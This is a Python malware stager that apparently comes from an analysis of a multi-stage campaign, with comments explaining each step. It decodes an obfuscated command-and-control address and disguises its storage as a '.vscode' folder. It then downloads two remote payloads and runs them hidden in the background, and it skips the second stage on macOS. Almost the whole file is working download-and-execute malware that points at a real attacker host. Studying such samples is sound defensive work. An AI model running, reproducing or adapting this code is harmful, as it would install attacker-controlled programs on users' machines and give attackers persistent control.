import platform, os, subprocess, sys
from base64 import b64decode

# Resolve the Python interpreter used to run this script
ze = sys.executable

# Ensure the 'requests' library is available.
# If missing, install it silently at runtime.
try:
    import requests
except:
    subprocess.check_call([ze, '-m', 'pip', 'install', 'requests'])
    import requests

# Detect operating system (Windows / Linux / Darwin)
ot = platform.system()

# Resolve the user's home directory
home = os.path.expanduser("~")

# Obfuscated C2 host:
# - Split into two parts
# - Reordered
# - Base64-decoded at runtime
host = "YzLjU2====NDUuNTkuMT"
host1 = b64decode(host[10:] + host[:10]).decode()

# Final C2 base URL (fixed port)
host2 = f'http://{host1}:1244'

# Stealthy persistence directory: looks like VS Code data
pd = os.path.join(home, ".vscode")

# Initial payload path
ap = pd + "/pay"

def rpy(pt):
    """
    Execute a payload in the background.
    On Windows: no window, detached process.
    On Unix-like systems: normal subprocess.
    """
    if ot == "Windows":
        subprocess.Popen(
            [ze, pt],
            creationflags=subprocess.CREATE_NO_WINDOW |
                          subprocess.CREATE_NEW_PROCESS_GROUP
        )
    else:
        subprocess.Popen([ze, pt])

def down_file(pt, api):
    """
    Download a remote payload from the C2 and write it to disk.
    The URL includes a campaign identifier (sType) defined in Layer 0.
    """
    # Remove existing file if present
    if os.path.exists(pt):
        try:
            os.remove(pt)
        except OSError:
            return True

    # Ensure persistence directory exists
    try:
        if not os.path.exists(pd):
            os.makedirs(pd)
    except:
        pass

    # Fetch payload from attacker infrastructure
    try:
        aa = requests.get(host2 + api + sType, allow_redirects=True)
        with open(ap, 'wb') as f:
            f.write(aa.content)
        return True
    except Exception as e:
        print(e)
        return False

# Stage 1: download and execute first binary
res = down_file(pt=ap, api="/payl/")
if res:
    rpy(ap)

# macOS is explicitly excluded after the first stage
# Indicates intentional platform targeting
if ot == "Darwin":
    sys.exit(-1)

# Stage 2: download and execute second binary
ap = pd + "/bow"
res = down_file(pt=ap, api="/bro/")
if res:
    rpy(ap)
